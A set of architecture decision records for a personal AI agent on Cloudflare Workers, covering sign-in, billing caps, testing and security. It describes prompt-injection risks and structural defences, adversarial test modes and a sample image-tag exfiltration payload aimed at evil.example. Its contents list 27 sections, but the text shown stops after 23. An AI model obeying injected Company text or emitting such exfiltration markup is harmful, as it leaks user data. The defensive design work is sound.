# Architecture and decisions

Why the Durable Personal Agent is built the way it is. The [spec](../durable-personal-agent-spec.md) says what is built and how; this file records the choices behind it, as decision records: the context, the choice, the alternatives and why they lost, the consequences, and when it was made. Commits are on `main`; every decision here was made between 9 and 12 October 2026. Where the commits and docs record the alternatives weighed, they are given as recorded; where they don't, the alternatives listed are the obvious ones and why they would lose, not a record of a debate.

Back to the [README](../README.md) · What's left to deploy and check: [deployment-tasks.md](deployment-tasks.md)

## The architecture in one paragraph

One Cloudflare Worker serves the page, signs people in with Google or GitHub, serves the agent's public Poppy identity and a public validator. Each signed-in identity gets one `PersonalAgent` Durable Object, which runs Pi through `PiHarness`, keeps the conversation and every piece of Poppy state in its own SQLite, and holds the Poppy client, its tools and a fetch-based browser. Two small Durable Objects share state across people: `CompanyLimiter`, one per Company, for rate limits, and `DomainBudget`, one per budget domain, for the demo's spend. Model calls go to Claude through AI Gateway, paid by the operator and capped, or straight to Anthropic or OpenAI with the person's own key. The [spec's Architecture section](../durable-personal-agent-spec.md#architecture) has the diagram.

## Contents

1. [A Worker and one Durable Object per person](#1-a-worker-and-one-durable-object-per-person)
2. [Pi through the harness, and the example's page](#2-pi-through-the-harness-and-the-examples-page)
3. [App sign-in in the Worker, not Cloudflare Access](#3-app-sign-in-in-the-worker-not-cloudflare-access)
4. [Who may sign in: owners, an allowlist, and `SIGNUP`](#4-who-may-sign-in-owners-an-allowlist-and-signup)
5. [The Poppy client inside each person's Durable Object](#5-the-poppy-client-inside-each-persons-durable-object)
6. [Prompt-injection defences that are structural](#6-prompt-injection-defences-that-are-structural)
7. [A strict mock Company as the test oracle](#7-a-strict-mock-company-as-the-test-oracle)
8. [Readings of an ambiguous draft](#8-readings-of-an-ambiguous-draft)
9. [An M×N interop harness](#9-an-mn-interop-harness)
10. [Third-party adapters frozen, and some kept unrun](#10-third-party-adapters-frozen-and-some-kept-unrun)
11. [Adversarial testing only against our own implementations](#11-adversarial-testing-only-against-our-own-implementations)
12. [A fetch-based browser instead of Browser Rendering](#12-a-fetch-based-browser-instead-of-browser-rendering)
13. [Model access: two lanes, caps in Durable Objects](#13-model-access-two-lanes-caps-in-durable-objects)
14. [Own keys: pasted, sent straight to the vendor](#14-own-keys-pasted-sent-straight-to-the-vendor)
15. [Two allowlists, and the demo's knobs](#15-two-allowlists-and-the-demos-knobs)
16. [Fork-safe configuration](#16-fork-safe-configuration)
17. [Testing: five suites](#17-testing-five-suites)
18. [Property tests with Hegel](#18-property-tests-with-hegel)
19. [A second client, in Python, with Hypothesis](#19-a-second-client-in-python-with-hypothesis)
20. [What we deliberately didn't do](#20-what-we-deliberately-didnt-do)
21. [CI scope](#21-ci-scope)
22. [Security hardening](#22-security-hardening)
23. [Compaction: a budget, our summarizer, the page](#23-compaction-a-budget-our-summarizer-the-page)
24. [Conformance levels from each requirement's basis](#24-conformance-levels-from-each-requirements-basis)
25. [A protocol view in Activity](#25-a-protocol-view-in-activity)
26. [Photos in the chat, uploaded only with the User's approval](#26-photos-in-the-chat-uploaded-only-with-the-users-approval)
27. [General tools beside Poppy: read_url, memory, time and maths](#27-general-tools-beside-poppy-read_url-memory-time-and-maths)

## 1. A Worker and one Durable Object per person

- **Context.** Each person needs one agent whose conversation and in-flight work survive reloads, deploys, crashes and closed tabs, and whose secrets are kept apart from everyone else's. The project wanted the smallest surface: no separate database, no queue, no servers.
- **Decision.** One Worker; one `PersonalAgent` Durable Object per signed-in identity, named `sha256("<provider>:<id>")` in the Worker only. Everything durable lives in that object's SQLite: Pi's transcript, every `poppy_*` table, sealed keys and tokens, demo spend. Shared state that no one agent can hold gets its own small Durable Object: `CompanyLimiter` per Company issuer (Companies limit by our one `client_id`), `DomainBudget` per budget domain.
- **Alternatives.**
  - *A database (D1) shared by all agents.* Every request would need a tenant check, and a bug in one would leak between people. A per-person object is the isolation.
  - *A stateless Worker with storage keyed by user.* It loses the single-threaded owner that makes ordering, retries and durable jobs simple.
- **Consequences.** One person's agent can't read another's state, by construction. A Google and a GitHub sign-in by the same person are two agents. Deleting an agent is `deleteAll()` after revoking its Account Tokens (milestone 2). Cross-person questions (a domain's spend, a Company's rate limit) need their own objects.
- **When.** The first spec and implementation, 9 October (`51d1c40`, `3b4fc71`).

## 2. Pi through the harness, and the example's page

- **Context.** The agent needs a model loop with tools that survives eviction mid-run, and a chat page. Cloudflare's Agents SDK ships a Pi harness and a Pi example with both.
- **Decision.** `PersonalAgent` is composed as the example composes its agent: `Lifecycle.install(this).use(poppy).use(webSockets).use(harness)`, with Pi's root session as the one conversation. `src/protocol.ts`, `sockets.ts`, `view.ts` and `transcript.ts` are copied byte for byte from `cloudflare/agents` at `48d9c36`, so they can be re-synced; our page is built around them.
- **Alternatives.** *Our own model loop* would have to re-solve replay after a crash, which Pi's durable runs and `replay: "safe"` tools already do. *The MCP SDK* for Company MCP servers: a small Streamable HTTP client is used instead, so the agent sees `structuredContent.operation` in tool results (Ops 4.2) and the client controls every header.
- **Consequences.** `PiHarness`, the Pi AI provider and Pi Durable are beta (a risk the spec lists). Tools declare whether a repeat is harmless, and only those replay after a crash.
- **When.** 9 October (`3b4fc71`); the Poppy capability on 11 October (`d853736`).

## 3. App sign-in in the Worker, not Cloudflare Access

- **Context.** The first build used Cloudflare Access in front of the Worker.
- **Decision.** Google and GitHub OAuth with PKCE, run in the Worker, then an HMAC-signed `__Host-session` cookie (HttpOnly, Secure, SameSite=Lax, 30 days). Google's ID token comes from its token endpoint over TLS, so its claims are checked without a signature check, as OpenID Connect allows; GitHub's numeric id names the agent.
- **Alternatives.** *Cloudflare Access.* Worker-level Access rejects WebSocket upgrades, which the chat needs, and a hostname-based Access application needs a custom domain the deployment didn't have.
- **Consequences.** The Worker owns the sign-in code, so it is tested against fakes of Google and GitHub that check the client, the redirect URI and the PKCE verifier, and can refuse in each way the code checks. Each deployer registers their own OAuth apps. GitHub's is configured for the live deployment; Google's isn't yet ([deployment-tasks.md](deployment-tasks.md)).
- **When.** 9 October, 50 minutes after the first build (`94be931`).

## 4. Who may sign in: owners, an allowlist, and `SIGNUP`

- **Context.** A deployment is run by someone who pays for it, and may be shared with a few people, or opened to anyone.
- **Decision.** `OWNERS` are always let in. `SIGNUP=allowlist` (committed) lets in only `SIGNIN_ALLOWLIST` besides; `SIGNUP=open` lets in anyone with a Google or GitHub account. Lists name Google emails, Google Workspace domains (from the `hd` claim, so a personal account using a work address doesn't count) and GitHub accounts by numeric id (a login can be renamed and re-registered). The check runs at the callback and again on every signed-in request.
- **Alternatives.** *Emails for GitHub accounts:* a verified email proves the address was once confirmed, not that the person still works there. *Checking only at sign-in:* someone removed would keep a 30-day session.
- **Consequences.** Removing someone takes a redeploy and locks them out on their next request; a WebSocket already open stays open until it reconnects.
- **When.** 11 October (`32930a2`); `OWNERS` and `SIGNUP` with model access (`e5b0818`).

## 5. The Poppy client inside each person's Durable Object

- **Context.** Poppy state is per person and per Company: User IDs, Sessions, DPoP keys, Account Tokens, pending sign-ins, conversations and their cursors, operations and approvals. Much of it must outlive a request (device polling, background reading, a confirm whose answer was lost).
- **Decision.** The client (`src/poppy/`) runs in the person's own Durable Object, as a Lifecycle capability with durable jobs. Session Tokens and DPoP private keys live only in memory; Account Tokens and sign-in secrets are sealed in that object's SQLite, bound to their row. Discovery goes through the validator, so the agent ingests only documents that pass. Every Poppy request goes through one HTTP client that signs a fresh DPoP proof, never follows a redirect with credentials, waits out `Retry-After`, and refuses a token in a URL.
- **Alternatives.** *A shared Poppy service* holding every person's tokens: one breach would expose everyone, and it would need its own tenant isolation. *Storing DPoP keys:* a stored key can be read from storage or backups; after an eviction the object makes a new key and binds the next token to it, as the Guides allow.
- **Consequences.** An eviction costs a token request per Company. Background work (device polling, conversation reading, operation tracking) survives restarts.
- **When.** 11 October (`d853736`).

## 6. Prompt-injection defences that are structural

- **Context.** Company messages, operation summaries, API and MCP descriptions and web pages all reach the model. The draft has no security considerations for this ([N15](spec-issues.md#n15)). A model can be talked into anything; the protocol's promises (only the User approves, `sender: "human"` only for the User's words) are ones Companies can't verify.
- **Decision.** Make the dangerous actions unreachable from the model, rather than asking it to behave:
  - No tool confirms or cancels an operation; only the page's buttons or a standing permission do.
  - `poppy_api_call` refuses any URL at or under a Poppy endpoint (token, sign-in, conversation, operations, browser-session: `protocolEndpoint` in `src/poppy/discovery.ts`), even when a Company's OpenAPI description lists one, so injected text can't make the model confirm an operation or post a message as the User.
  - Every write waits on a local approval card that shows the exact request, and only its Approve sends it, once, unless the Company has the Operations extension and its description says that write proposes an operation (amended 12 October: before, every write at such a Company went straight through, and a Company may use operations for only some actions).
  - Standing permissions are created by the User on the page, never by the model. One applies only when the summary begins with its action and every term is one it can check: money within its limit, a date, or the draft's example ids (amended 12 October: before, a word anywhere in the summary and only `{ amount, currency }` terms were checked, so a flag or a recurrence passed).
  - Tools never take or return tokens, keys, codes or credentials; Company text reaches the model labelled as information, never approval.
- **Alternatives.** *Prompting the model to ignore instructions in Company text* is still done, but nothing depends on it.
- **Consequences.** Tested with a faux model that obeys any instruction it reads (`test/prompt-injection.test.ts`): nothing is confirmed, sent as the User or leaked. A real model's susceptibility isn't measured, and doesn't need to be for these actions.
- **When.** The approval gate and page-only confirms from the first client (`d853736`); the Poppy-endpoint refusal and the obeying faux model on 11 October (`4eb36a7`).

## 7. A strict mock Company as the test oracle

- **Context.** The client can't be tested against production: our agent hasn't run against a live Company (Spot publishes valid discovery but isn't in the grid; [ecosystem.md](ecosystem.md#companies-you-can-reach)). Other implementations were days old and disagreed.
- **Decision.** A strict mock Company (`test/mock-company/`) in a Durable Object that checks every request our client sends: client metadata and keys, assertions, DPoP proofs, token binding, scopes, message ids, approvals. Each check has a stable id in `violations.ts`; an `afterEach` fails any Poppy test whose mock recorded a violation it didn't declare (`expectViolations`); each check has a `TAMPERS` row that breaks one thing in an otherwise correct request and proves the check fires, and a catalog test fails if a check has no row.
- **Alternatives.** *Happy-path fakes* would pass a client that sends the wrong `aud` or reuses a `jti`. *Another project's Company* as the oracle: each had its own gaps and readings ([poppy-issues.md](poppy-issues.md)), and none checked everything a Personal Agent sends.
- **Consequences.** A new Poppy feature needs a test, and a mock check with a `TAMPERS` row where the draft has a MUST. A misreading the client and mock share is invisible to these tests, which is why decisions [8](#8-readings-of-an-ambiguous-draft), [9](#9-an-mn-interop-harness) and [19](#19-a-second-client-in-python-with-hypothesis) exist.
- **When.** 11 October: the mock (`d853736`), strict assertions (`4ade599`), named checks and `TAMPERS` (`c1f5f53`), no violations by default (`fcf29cf`).

## 8. Readings of an ambiguous draft

- **Context.** Draft 0.1 leaves questions open that change what goes on the wire: the client assertion's `aud` (S1), assertion `typ` and lifetime (S2), where metadata lives for an issuer with a path (S3), DPoP nonce scope (S23), and more.
- **Decision.** Strict where the ambiguity is security-relevant, lenient where it's cosmetic, following [RFC 9413](https://www.rfc-editor.org/rfc/rfc9413.html): send the narrowest reading; refuse, or record a named violation, wherever a wrong guess could widen access, mix up identities or allow a replay. Each choice is recorded in [readings.md](readings.md) and declared in the interop adapters' `readings`. The mock runs as two references: `dpa-mock`, lenient where the draft is silent (S2), is the grid's reference Company; `dpa-mock-strict` keeps the strict checks. The conformance tests also run sign-in, Sessions and sign-out under six profiles that take the other answers.
- **Alternatives.** *Postel's "be liberal in what you accept"* everywhere: RFC 9413 argues it turns one implementation's bug into everyone's protocol. *Strict everywhere, one reference:* a strict reference refused every typ-less agent at the first token request, so nothing past it was tested.
- **Consequences.** A failure caused only by an open question is blamed on the spec (attribution rule 3), with evidence in the trace. The open questions go to the draft's authors as [spec issues](spec-issues.md).
- **When.** Profiles 11 October (`fcf29cf`); lenient and strict reference mocks (`33ec7e1`); `readings.md` (`f478047`), made to match the code (`8960f17`).

## 9. An M×N interop harness

- **Context.** Passing our own mock proves conformance to our readings, not interoperability. Several projects had agents and Companies; none had been run against the others.
- **Decision.** `interop/`: a Node runner that builds each implementation's container, runs every agent against every Company over HTTPS through a recording TLS proxy, with scenarios as data ([pirate testing](https://blog.oshineye.com/2010/02/pirate-testing.html)) and blame by named rules ([interop-spec.md](interop-spec.md) §9): a one-sided violation, the grid pattern against the reference Company, a reading difference the trace shows mattered, or unattributed.
  - **Known failures** (`known-failures.json`, `*` for any agent, Company or scenario, one entry per root cause) don't fail the run, but an entry that matched no failed cell in a run that could judge it is stale and does, so a fix can't go unnoticed (MCP conformance's rule). Each entry also says what its failure looks like (blame, error check ids, the failed step's code), and a cell counts as known only when it matches, so a new regression in a cell that already had a known failure can't hide behind it.
  - **Flaky cells.** A failed cell runs once more; a pass then is flaky, counts as a pass, is listed apart, and never matches a known failure.
  - Our agent there is `src/poppy` in Node with no model, so results never depend on an LLM.
- **Alternatives.** *One-sided conformance suites only* (Datalayer's vectors, poppyseed's checker) test one side, and can't find two conforming implementations that fail together. *`wrangler dev` for our side:* Node trusts the run's CA, starts in a second, and needs no `workerd` networking in a container.
- **Consequences.** The 11 October grid ([summary](interop-results/README.md)) gave evidence for S1, S2 and S9, found spec issues N39 to N42 (N36 to N38 were later withdrawn as our misreadings) and per-project bugs ([poppy-issues.md](poppy-issues.md)), and ended with every failure a known one. Harness bugs were as common as implementation bugs at first.
- **When.** 11 October: design (`850860c`), contract (`1cb5835`), runner (`909fffa`), wildcards and two reference mocks (`33ec7e1`), stale entries and flaky retries (`8fde2fb`).

## 10. Third-party adapters frozen, and some kept unrun

- **Context.** Every other implementation was days old and changing hourly.
- **Decision.** Each third-party adapter fetches upstream at a pinned commit, and every change an implementation needed to act as a peer is an interop-only setting or a patch listed in its manifest's `relaxations`. Base images are pinned by digest. By the owner's choice, three things are kept but not run until our own agent is verified against a live Company: the **live lane** (our agent against public deployments, signed-out scenarios only, one request a second), and the **everruns** and **typo3** adapters (everruns' were written but its images never built for lack of Docker disk; typo3's is a README, since the extension it would run is private).
- **Alternatives.** *Tracking upstream heads* would make every run a moving target. *Running the live lane now* would test public deployments before our side is known to be right.
- **Consequences.** Pins are bumped deliberately, then the grid is rerun. The [deployment tasks](deployment-tasks.md) list when the live lane and the unrun adapters come in.
- **When.** 11 October (`f3f5fcb`, `1ea0cf3`, `79f8220`; digests `6f6b4e8`).

## 11. Adversarial testing only against our own implementations

- **Context.** Interop tests honest peers. Refusals need dishonest ones: a malicious Company, a malicious agent, a network attacker. But a failure there against someone else's code may be a vulnerability in it.
- **Decision.** `evil-company` and `evil-agent` (our mock and our agent with an attack switch) and a fault-injection mode in the proxy, judged by harm oracles over the trace. The runner refuses any adversarial or faulted cell unless every honest side is `owner: "self"`, and never runs one on the live lane. No flag lifts this; changing it is a reviewed code change, and [SECURITY.md](../SECURITY.md) sets out disclosure: maintainers first, privately, with a 90-day window, and nothing posted to another project without the owner's approval.
- **Alternatives.** *Running attacks across the grid* would find more, but would publish other people's vulnerabilities before they could fix them, and attack deployments whose owners hadn't agreed.
- **Consequences.** The grid says nothing about whether other projects refuse our attacks. What's built and what isn't is in [adversarial-interop.md](adversarial-interop.md); its `XK` rug pull was dropped because our client never observes it (spec issue [N44](spec-issues.md#n44)).
- **When.** 11 October (`3db051b`, `e42bff1`; SECURITY.md `f478047`).

## 12. A fetch-based browser instead of Browser Rendering

- **Context.** Poppy §5 lets an agent browse a Company's website in a Session. The first build used Cloudflare Browser Rendering (a headless browser).
- **Decision.** `FetchBrowser` (`src/poppy/fetch-browser.ts`): plain HTTPS from the Durable Object, pages read with `HTMLRewriter` as title, text, links and forms, a host-only cookie jar per Session, no JavaScript. `click` follows links only; `submit` works out exactly what a form would send, shows every visible value on an approval card, and only the User's approval sends exactly that. Every form submission needs approval, whether or not the Company has the Operations extension, because the draft gives website actions no approval step ([N43](spec-issues.md#n43)).
- **Alternatives.** *Keep Browser Rendering.* It is a paid service, no Company needs JavaScript browsing yet, and our adapter for it let `click` send a form without the approval `submit` requires. That bug was ours, not Browser Rendering's or the draft's, but a browser with no scripts makes the class of bug impossible.
- **Consequences.** A site that needs JavaScript to show its pages or send its forms can't be browsed; the page says so. Browsing is the last resort after APIs and the Company Agent anyway. Removing it also found two bugs: browser contexts shared between people in one isolate, and approved submits that always failed. Revisit if a Company needs JavaScript.
- **When.** 11 October (`446113a`; N43 `3f5fa07`).

## 13. Model access: two lanes, caps in Durable Objects

- **Context.** The operator wants to offer Claude to a few people at their own cost, with a hard daily ceiling, and let anyone else bring a key. A model call happens on the person's turns, on background turns (a Company's message), and on every tool round.
- **Decision.** Pi sees one model whose provider picks the lane before every call (`src/model-router.ts`):
  1. **Own key**, if the person has one: it always wins.
  2. **Refused key:** a 401 marks it invalid and stops calls; it never falls back to the demo.
  3. **Demo**, for `OWNERS` and `DEMO_ALLOWLIST`: the AI binding through the gateway named by `DEMO_GATEWAY_ID`, on Unified Billing (the operator holds no provider key), with metadata `u` (a hash naming the agent) and `d` (the budget domain).
  4. Otherwise **no model calls**; background notices wait.

  The demo's primary limit is ours: each call's pi-ai cost goes into the agent's own ledger and the domain's `DomainBudget`, and both caps are checked before the call. The gateway's spend rules, split by `metadata.u` and `metadata.d` with a pooled daily cap, are set in the dashboard as a backstop only.
- **Alternatives.** *Gateway spend rules as the only limit:* they are eventually consistent, work only for priced models, and answer after the fact, so a cap couldn't be shown in Settings or enforced before a background turn. *Caps in the Worker:* it has no durable place for a running total.
- **Consequences.** A cap can be overshot by the calls already in flight, one per agent; costs are pi-ai's catalog prices, an estimate before Unified Billing's fee. Nothing here is tried live yet: the spec's "Check live" list and [deployment-tasks.md](deployment-tasks.md).
- **The model: Claude Sonnet 5.5.** `DEMO_MODEL_ID` is `anthropic/claude-sonnet-5-5` and `ANTHROPIC_MODEL_ID` `claude-sonnet-5-5` (OpenAI's is unchanged). In pi-ai's catalog Sonnet 5.5 costs half what Opus 5.5 does per input, output and cache-write token ($2, $10 and $2.50 a million, against $4, $20 and $5; cache reads are $0.20 for both), with the same 1M-token window, so the same demo caps go twice as far. Opus stays one var change away: set either var back to Opus 5.5's id. *Alternative: Opus 5.5,* the first choice; it halves what each cap buys.
- **When.** 11 October (`e5b0818`; Settings `83d4d81`); Sonnet 5.5, 12 October.

## 14. Own keys: pasted, sent straight to the vendor

- **Context.** People without the demo need to bring their own model access, and the operator must never pay for it or be able to spend it by accident.
- **Decision.** A pasted Anthropic or OpenAI API key, and nothing else. It is checked with a free vendor call (list models), sealed in the person's agent under `TOKEN_ENC_KEY` with additional data naming the agent and provider, and opened only for a call or a check. pi-ai's own `anthropic` and `openai` providers send it straight to the vendor, never through the operator's gateway, with an auth context that holds no ambient credentials (under `nodejs_compat`, `process.env` holds the Worker's secrets). Settings says the operator can technically read it, and advises a spending limit at the provider.
- **Alternatives.**
  - *BYOK on the gateway* (provider keys stored in AI Gateway). Keys are stored per gateway in the operator's account, not per person, so people's keys would leave their agents for the operator's dashboard, and own-key and demo calls would share one path, where a routing mistake bills the wrong party. Keeping own-key calls off the AI binding means a request that lost its key can't be billed to the operator. The setup guide says to store no BYOK keys on any gateway.
  - *OpenRouter.* Considered and built (`e5b0818`), as a third own-key lane with its own OAuth (PKCE) connect flow; then dropped by the owner (`e6751ce`), leaving one way to bring a key and two vendors. A stored OpenRouter key from before is deleted unopened, and the agent carries on as if it had none.
- **Consequences.** Own-key calls are tested against fakes of each vendor's streaming format, and a fake that refuses any request carrying gateway credentials. Streaming with real keys in workerd isn't tried yet.
- **When.** 11 October (`e5b0818`, `e6751ce`).

## 15. Two allowlists, and the demo's knobs

- **Context.** "Who may sign in" and "who the operator pays for" are the same list only while sign-up is closed.
- **Decision.** Two lists: `SIGNIN_ALLOWLIST` and `DEMO_ALLOWLIST`, in the same format, plus `OWNERS`, who are on both. The demo's knobs stay settings: `DEMO_DAILY_USD_PER_USER` and `DEMO_DAILY_USD_PER_DOMAIN` (`0` turns the demo off), `DEMO_MODEL_ID` (which must have a price in pi-ai's catalog, or the caps can't work), `DEMO_GATEWAY_ID`, and `SIGNUP`.
- **Alternatives.** *One renamed list:* removing someone's demo would look like removing their account. *Hard-coded caps:* each deployer pays differently.
- **Consequences.** With `SIGNUP=open` anyone can sign in, and pays with their own key unless on the demo list; every agent created still costs the operator storage.
- **When.** 11 October (`e5b0818`).

## 16. Fork-safe configuration

- **Context.** The repository will be copied. A fork must not inherit the author's identities or host, and a deploy from a checkout without the deployer's settings must not wipe production's.
- **Decision.** The committed `wrangler.jsonc` holds empty `OWNERS`, allowlists, `PUBLIC_ORIGIN` and `POPPY_LOGO_URI`, and every route but the validator fails closed, naming the setting, until they're set. Each deployer keeps their values in the untracked `deployment.local.json` (shape in `deployment.example.json`), which `vite` lays over the template, refusing names it doesn't declare. `npm run deploy` runs `scripts/check-deployment.ts` between the build and `wrangler deploy` and stops if the build is unconfigured. `test/template.test.ts` scans every committed file except docs and fails if a deployer's identity or origin, a non-example email, or another `workers.dev` host appears.
- **Alternatives.** *Committed values with a "change these" note:* forks would run as the author. *`secrets.required` in Wrangler:* it drops every `.dev.vars` secret not listed, and listing the OAuth secrets would fail the deploy of a deployment with one provider.
- **Consequences.** A fresh clone answers every route but the validator with a config error until configured. Docs may name the live host; nothing else may.
- **When.** 11 October (`e5b0818`; the scan widened in `9505bbb`).

## 17. Testing: five suites

- **Context.** The code runs in three places: workerd (the Worker and Durable Objects), the browser (the page) and Node (the interop runner, the property engine).
- **Decision.** `npm test` runs five Vitest suites one after another: Workers, durability, page, interop and properties. The spec's [Testing and conformance](../durable-personal-agent-spec.md#testing-and-conformance) table is the one list of what each holds. Each exists for a runtime reason: durability resets every Durable Object, which would break other files' objects in the shared runtime; the page needs happy-dom; the interop runner and Hegel's engine (loaded by FFI) need Node. The model, Anthropic, OpenAI, Google, GitHub and Companies are all faked; nothing calls the network. Appendix A maps every Poppy requirement to a named test, and `npm run check:docs` fails if a named test doesn't exist. The docs give no test counts.
- **Alternatives.** *One suite:* not possible across these runtimes. *Hand-kept counts in the docs:* they drifted, and the check for them was removed (`a654175`).
- **Consequences.** A new test goes in the suite whose runtime it needs.
- **When.** CI and the docs check 11 October (`065b2c5`); the durability runtime (`65ad158`); properties (`5421e66`).

## 18. Property tests with Hegel

- **Context.** Example tests check the cases someone thought of. The client's pure parts (scopes, `WWW-Authenticate`, `Retry-After`, path templates, private hosts, JWTs) and discovery take hostile input.
- **Decision.** Property-based tests with [Hegel](https://hegel.dev), the Hypothesis team's library, in the properties suite: each contract tested both ways (what must be accepted, and what must be refused, with the refusal named), our assertions and proofs mutated one thing at a time against the mock, and a model-based run of honest steps against the mock in process. 100 cases a property in CI; `HEGEL_CASES=5000` locally. The Hegel and hegel-review skills (`.claude/skills/`, copied at a pinned commit) guide writing and reviewing them, and a failing property is fixed, never weakened.
- **Alternatives.** *fast-check*, used first for the JSON parsers and the page; replaced by Hegel so the project has one property engine, with Hypothesis's shrinking and a local database of failing examples (`.hegel/`) (`7fb2357`).
- **Consequences.** The properties found six client bugs, each now an example test: junk `Retry-After` read as a past date, `localhost.` passing the private-host check, a non-UTF-8 body thrown as a TypeError, a path value of `..` reaching another resource (`5421e66`), quoted-pairs misread in `WWW-Authenticate`, and inherited names such as `constructor` filling path templates (`a54dcd7`).
- **When.** 11 October (`3985ab6`, `5421e66`, `7fb2357`, `a54dcd7`).

## 19. A second client, in Python, with Hypothesis

- **Context.** Our client and our mock were written by the same people under the same readings, so a misreading they share passes every test, and the interop grid only shows it if another project happens to differ.
- **Decision.** An independent Poppy client in Python (`test/hypothesis/`), written from the draft and our spec's readings, not ported from `src/poppy`, driving a Hypothesis stateful, model-based test (`RuleBasedStateMachine`) of the mock over HTTP on localhost, with every response and violation held to a model. Hypothesis because its stateful testing is the most mature: rules, invariants, and shrinking to a minimal sequence. It runs locally only (`npm run test:hypothesis`, needing `uv`), not in `npm test` or CI.
- **Alternatives.** *More properties in TypeScript:* they share our code's assumptions. *Another project's client:* each has its own readings and gaps, and none exposes a stateful driver.
- **Consequences.** It found five bugs in the mock: a retry whose JSON members were in another order treated as a conflict (S9), well-formed language tags and time zones recorded as violations, revoking an Account Token signing out the whole account rather than its own Sessions (N4), reuse detection revoking the account's other sign-ins, and a retried first message answered after sign-out without the 7.11 check (S8). Each is now a Workers test. Not covered: Operations, MCP, browsing, handoff and Direct Conversations.
- **When.** 11 October (`a44b3c1`, `e74bfb7`).

## 20. What we deliberately didn't do

Ruled out by the owner, for cost and risk:

- **Systematic durability and crash testing** beyond what exists: the durability suite crashes every Durable Object and reloads the conversation once, and the Workers suite plays restarts with fault seams (an answer lost, a gateway 504, memory forgotten). Killing the object at every step of a sign-in or operation in a real runtime, or running against a deployment, wasn't done.
- **Automated mutation testing** of `src/`. What stands in for it: the mock's `TAMPERS` rows (each check proven to fire), the faults planted by hand that the spec's "Checks that tests catch bugs" lists, and `INTEROP_FAULT` for attribution.
- **A staging deployment.** It was built, with a read-only post-deploy check and rollback notes (`f478047`), then removed (`2813756`): it was about deploying the app, not about Poppy, and a second Worker would need its own OAuth apps and secrets for one user.

## 21. CI scope

- **Context.** CI time and noise matter more than ceremony for a one-owner project.
- **Decision.**
  - **CI** (`.github/workflows/ci.yml`): typecheck, the five suites and the docs check, on pushes to `main` and on pull requests, so a branch with an open pull request runs once. It also refuses global Durable Object resets outside the durability suite.
  - **Interop** (`.github/workflows/interop.yml`): our agent against both mocks in Docker, in its own workflow, only when the client, the validator, the mock, the harness or the dependencies change. The results are an artifact.
  - **Dependencies** (`.github/workflows/deps.yml`): `npm run deps:check` on the 1st of each month and by hand, writing `npm outdated` and `npm audit` (production, then production and dev) to the job summary. It fails only for an audit finding at high or above; outdated packages are information. It needs no secrets, reads the repository only, and opens no pull requests; about a minute a month.
  - **Node 24**, the newest LTS line on 12 October 2026, everywhere: `engines` (`>=24`), `.nvmrc`, all three workflows and our own interop images (`node:24-slim`, `node:24-alpine`, pinned by digest). Node 24 moves to maintenance on 20 October 2026 (supported until April 2028) and Node 26 becomes LTS on 28 October 2026; moving to 26 is a later, deliberate change. The workflows use the actions' Node 24 majors (`checkout`, `setup-node` and `upload-artifact` at `v7`).
  - **The pre-push hook** (`.githooks/pre-push`) runs only typecheck, about five seconds; CI runs the rest.
  - **Cut** (`a654175`): the committed grid results (about 4 MB, stale on the next run; a dated summary stays in `docs/interop-results/`), and the outbound test vectors (our validator fixtures and tamper rows exported for a shared repository that was never made; nothing consumed them). The inbound runner for Datalayer's vectors stays.
- **Alternatives.** *The full grid in CI:* Docker builds of every project take too long for each push, and their failures are upstream's. *Tests in the hook:* slow pushes for checks CI repeats. *Dependabot:* the owner's choice was a monthly report to read, not a stream of pull requests to triage. *Node 26 now:* it isn't LTS until 28 October.
- **Consequences.** The full grid and the Hypothesis client run by hand.
- **When.** 11 October (`065b2c5`, `a654175`); the dependency check and Node 24, 12 October.

## 22. Security hardening

Each of these closed a specific gap, and each has a test:

- **A Content-Security-Policy on every page** (`src/csp.ts`; `public/_headers` for the static page, kept equal by a test): images from this origin or `data:`, scripts and connections to this origin, no framing. **Images the model writes** load only from this origin or `data:`; any other becomes a link. Before this, a prompt injection could make the model write `![x](https://evil.example/?d=…)` and the browser would send the data out (`d3a3186`).
- **Deadlines on every request and its body.** Token and revocation requests get 15 s for answer and body; API, conversation and operations requests 30 s for the answer to start (plus a long poll's `wait`) and 30 s for the body, which is cancelled when it stalls. Before, only the request had a timeout, so a stalled body was read forever (`9a494fd`).
- **Private-host checks** on everything a Company controls: IP literals, single-label names, and special-use and private-use names (`localhost`, `.local`, `.internal`, `.home.arpa`, …) are refused, written with or without the root's trailing dot, directly or by redirect, in the client and the validator alike (a property checks they agree). Names alone can't catch one that resolves to a private address: Workers refuse those connections themselves, and the Node CLI resolves each name, refuses private addresses and pins its connection to the address it checked (`scripts/node-fetcher.ts`). The library on its own checks names only.
- **Sealing with versioned keys.** Account Tokens, pending sign-in secrets and model keys are AES-GCM sealed under `TOKEN_ENC_KEY`, bound to their row or agent and provider by additional data, written as `v1.…`. `TOKEN_ENC_KEY_PREVIOUS` lets a key rotate: old values still open and are sealed again when used (`e5b0818`).
- **Tokens only to the Company's hosts:** a Session Token goes only to a host `poppy.json` lists or under the Company's domains; an OpenAPI server elsewhere is refused before any request ([N10](spec-issues.md#n10)).

## 23. Compaction: a budget, our summarizer, the page

- **Context.** The conversation never ends. pi-durable compacts it by itself, but relative to the model's window: with Claude's 1M tokens and pi's defaults, a summary started near 950k tokens and blocked near 984k, so every turn before that paid for the whole conversation, and the router lent every lane the demo model's 1M window, misjudging OpenAI's 272k. pi's own summary prompt reads the transcript as "[User]" and "[Assistant]", and the Poppy client's notices (a Company's message, an operation proposed) reach the model as user messages, so a summary could turn a Company's words into the User's wishes. pi keeps every entry, but its snapshot starts at the summary, so a reloaded page lost the messages before it, and showed the summary as something the person said.
- **Decision.** In `src/compaction.ts`:
  - **A budget** for every lane: the router reports `min(200k, the lane model's window)` as its window, and pi's settings are `reserveTokens` 16,000, `backgroundTokens` 34,000 and `keepRecentTokens` 30,000. A summary starts in the background over 150k tokens, a request waits for one over 184k, and the newest ~30k stay verbatim. pi's own fallback stays: a request the provider calls too long is summarised and tried once more.
  - **Our summarizer**, on pi's `beforeCompact` hook. The hook can only decline or supply the summary text; it can't change pi's prompt or its input. So it asks the model itself, through the router (so a summary on the demo lane is capped and metered like any call), with a prompt that labels the User's words, Company messages, tool results and the agent's own notices apart, keeps Company text attributed, and never records an approval or a secret. The summary is memoized on pi's task, so a replay doesn't pay twice. A failed call declines: nothing is summarised, nothing lost.
  - **`poppy_status` with no domain** lists everything open at every Company, and the Poppy prompt tells the model to call it after a summary. Approvals stay on cards; a summary can't carry one.
  - **The page** shows a summary as a notice and, after a reload, asks the agent (`history.before`, `src/history.ts`) for the entries before it. All of this is in our code; the four files copied from Cloudflare's example are untouched.
